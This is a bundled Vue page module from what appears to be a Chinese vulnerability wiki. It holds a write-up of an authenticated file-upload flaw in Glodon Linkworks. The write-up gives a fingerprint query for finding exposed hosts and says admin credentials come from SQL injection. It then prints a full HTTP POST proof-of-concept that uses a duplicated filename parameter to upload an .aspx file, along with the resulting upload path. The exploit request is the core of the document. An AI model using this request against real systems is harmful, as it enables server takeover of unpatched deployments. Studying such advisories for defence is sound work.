import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},s=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>广联达 Linkworks msgbroadcastuploadfile.aspx 存在后台文件上传漏洞，攻击者通过SQL注入获取管理员信息后，可以登陆发送请求包获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>广联达 Linkworks</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>web.body=&quot;/Services/Identification/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828150337640.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>GTP.IM.Services.Group.WebSite.GTP.IM.Services.Group 存在文件上传，上传后在当前目录 Upload下</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828150355277.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过SQL注入获取管理员账号密码后登陆后台上传文件,验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Cookie: 0_styleName=styleA

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename=&quot;1.aspx&quot;;filename=&quot;1.jpg&quot;
Content-Type: application/text

Test

------WebKitFormBoundaryFfJZ4PlAZBixjELj--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828150407255.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/GTP/IM/Services/Group/Upload/xxx-xxx-test.aspx
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828150419196.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16),d=[s];function r(l,o){return a(),i("div",null,d)}const u=e(t,[["render",r],["__file","广联达 Linkworks msgbroadcastuploadfile.aspx 后台文件上传漏洞.html.vue"]]);export{u as default};
